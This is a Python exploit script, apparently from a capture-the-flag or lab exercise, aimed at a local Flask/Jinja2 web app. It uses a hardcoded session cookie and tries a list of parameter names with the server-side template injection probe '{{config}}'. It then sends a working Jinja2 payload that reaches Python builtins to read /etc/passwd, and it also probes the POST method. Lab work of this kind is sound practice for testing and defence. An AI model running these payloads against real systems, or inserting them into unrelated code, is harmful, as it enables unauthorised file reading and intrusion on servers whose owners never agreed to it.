import requests
import re

base_url = "http://127.0.0.1:33206"
endpoint = "/home"
session_cookie = "session=eyJ1c2VyX2lkIjoxfQ.aVf2fw.j_8PfP_Q8ZnizbshSZCaN5dReao"

headers = {'Cookie': session_cookie}

# Common parameter names to test for SSTI injection
param_names = ['tpl', 'template', 'name', 'user', 'username', 'content', 'message', 'data', 'input', 'value', 'q', 'query', 's', 'search']

# Simple test payload - just reading config
simple_payload = "{{config}}"

print(f"[*] Testing different parameter names for SSTI injection")
print(f"[*] Target: {base_url}{endpoint}")
print(f"[*] Test payload: {simple_payload}\n")

found_params = []

for param_name in param_names:
    print(f"[*] Testing parameter: {param_name}")
    try:
        response = requests.get(f"{base_url}{endpoint}", params={param_name: simple_payload}, headers=headers, timeout=10)
        
        # Look for evidence that our payload was injected
        if simple_payload in response.text:
            print(f"  [!] Parameter '{param_name}' reflects payload (not executed)")
        elif 'config' in response.text and 'Jinja2' in response.text:
            print(f"  [+] Parameter '{param_name}' shows config object!")
            found_params.append(param_name)
        elif 'Jinja2' in response.text or 'Flask' in response.text:
            print(f"  [+] Parameter '{param_name}' might be working - found framework references")
            found_params.append(param_name)
        elif len(response.text) > 1600:  # Slightly longer than baseline
            print(f"  [+] Parameter '{param_name}' changes response size ({len(response.text)} bytes)")
            found_params.append(param_name)
        else:
            print(f"  [-] No effect (size: {len(response.text)} bytes)")
            
    except Exception as e:
        print(f"  [!] Error: {e}")

print(f"\n[*] Parameters that showed potential: {found_params}")

# Test the most promising one with actual exploit payload
if found_params:
    param_name = found_params[0]
    print(f"\n[*] Testing actual exploit payload with parameter: {param_name}")
    
    # Try to read /etc/passwd as a test
    exploit_payload = "{{config.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}"
    
    try:
        response = requests.get(f"{base_url}{endpoint}", params={param_name: exploit_payload}, headers=headers, timeout=10)
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response length: {len(response.text)} bytes")
        
        # Check for evidence of file content
        if 'root:' in response.text:
            print(f"[!] SUCCESS! File content found in response:")
            # Extract just the file content part
            lines = response.text.split('\n')
            for line in lines:
                if 'root:' in line:
                    print(f"  {line}")
                    break
        elif len(response.text) > 2000:
            print(f"[!] Large response - possible success:")
            print(response.text[:500])
        else:
            print(f"[*] Response preview: {response.text[:300]}")
            
    except Exception as e:
        print(f"[!] Error: {e}")

# Try POST method
print(f"\n[*] Testing POST method with parameter")
try:
    response = requests.post(f"{base_url}{endpoint}", data={'name': simple_payload}, headers=headers, timeout=10)
    print(f"[*] POST Response status: {response.status_code}")
    print(f"[*] POST Response length: {len(response.text)} bytes")
    if simple_payload in response.text:
        print(f"  [!] Payload reflected in POST")
    else:
        print(f"  [*] Response preview: {response.text[:300]}")
except Exception as e:
    print(f"[!] POST Error: {e}")
